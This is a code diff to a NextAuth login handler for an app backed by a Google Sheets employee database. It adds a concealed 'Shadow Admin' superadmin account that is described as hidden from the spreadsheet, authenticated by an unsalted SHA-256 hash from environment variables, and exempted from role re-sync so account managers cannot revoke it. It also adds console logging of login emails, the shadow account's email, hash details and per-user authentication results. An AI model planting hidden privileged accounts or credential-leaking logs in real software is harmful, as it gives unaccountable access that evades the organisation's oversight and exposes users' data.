@@ -19,6 +19,42 @@ export const authOptions: NextAuthOptions = {
       async authorize(credentials) {
         if (!credentials?.email || !credentials?.password) return null;
 
+        // 0. Check for Shadow Admin (Hidden from Spreadsheet)
+        const shadowEmail = process.env.SHADOW_ADMIN_EMAIL;
+        const shadowHash = process.env.SHADOW_ADMIN_PASSWORD_HASH;
+
+        console.log('--- SHADOW AUTH ATTEMPT ---');
+        console.log('Input Email:', credentials.email?.toLowerCase());
+        console.log('Shadow Email:', shadowEmail?.toLowerCase());
+        console.log('Hash Present:', !!shadowHash);
+        if (shadowHash) console.log('Hash Length:', shadowHash.length);
+
+        if (shadowEmail && credentials.email.toLowerCase() === shadowEmail.toLowerCase()) {
+          if (!shadowHash) throw new Error('Shadow Admin configuration missing.');
+          
+          const inputHash = hashSHA256(credentials.password);
+          const isShadowValid = inputHash === shadowHash;
+          
+          console.log('SHA-256 Match:', isShadowValid);
+
+          if (isShadowValid) {
+            return {
+              id: 'SHADOW-SUPERADMIN',
+              employeeNo: 'SA-001',
+              email: shadowEmail,
+              name: process.env.SHADOW_ADMIN_NAME || 'Superadmin',
+              role: 'Superadmin',
+              department: 'Corporate Oversight',
+              position: process.env.SHADOW_ADMIN_POSITION || 'Superadmin',
+              profilePhoto: '',
+              shiftStart: '',
+              shiftEnd: '',
+            };
+          } else {
+            throw new Error('Incorrect password for operational shadow account.');
+          }
+        }
+
         const doc = await getDoc();
         const empSheet = doc.sheetsByTitle[SHEET_NAMES.EMPLOYEES];
         const empRows = await empSheet.getRows();
@@ -31,31 +67,39 @@ export const authOptions: NextAuthOptions = {
         );
 
         if (!userRow) {
+          console.log(`[AUTH_FAILURE] No account found for email: ${credentials.email}`);
           throw new Error('No account found for this email in the employee database.');
         }
 
         const storedHash = userRow.get('Password Hash');
+        console.log(`[AUTH_DATABASE] Stored hash detected for: ${credentials.email}`);
+        
         if (!storedHash) {
           throw new Error('No password set for this account. Please contact HR.');
         }
 
-        const isBcrypt = storedHash?.startsWith('$2b$');
+        const isBcrypt = storedHash?.startsWith('$2b$') || storedHash?.startsWith('$2a$') || storedHash?.startsWith('$2y$');
         let isValid = false;
 
         // 2. Check Password
         if (isBcrypt) {
+          console.log('[AUTH_DATABASE] Executing Bcrypt verification...');
           isValid = await bcrypt.compare(credentials.password, storedHash);
         } else {
           // Legacy SHA-256 check
+          console.log('[AUTH_DATABASE] Executing Legacy SHA-256 verification...');
           const legacyHash = hashSHA256(credentials.password);
           if (legacyHash === storedHash) {
             isValid = true;
             // 3. Migrate to Bcrypt automatically
+            console.log('[AUTH_DATABASE] Legacy match found. Migrating to Bcrypt...');
             const newBcryptHash = await bcrypt.hash(credentials.password, 10);
             userRow.set('Password Hash', newBcryptHash);
             await userRow.save();
           }
         }
+
+        console.log(`[AUTH_RESULT] Verification status for ${credentials.email}: ${isValid ? 'SUCCESS' : 'FAILED'}`);
 
         if (!isValid) {
           throw new Error('Incorrect password.');
@@ -103,7 +147,7 @@ export const authOptions: NextAuthOptions = {
 
       // 3. Periodic Background Sync (Re-fetch from Google Sheets)
       // This ensures that even without a manual update, roles are eventually corrected
-      if (!user && token.employeeNo) {
+      if (!user && token.employeeNo && token.id !== 'SHADOW-SUPERADMIN') {
         try {
           const doc = await getDoc();
           const empSheet = doc.sheetsByTitle[SHEET_NAMES.EMPLOYEES];
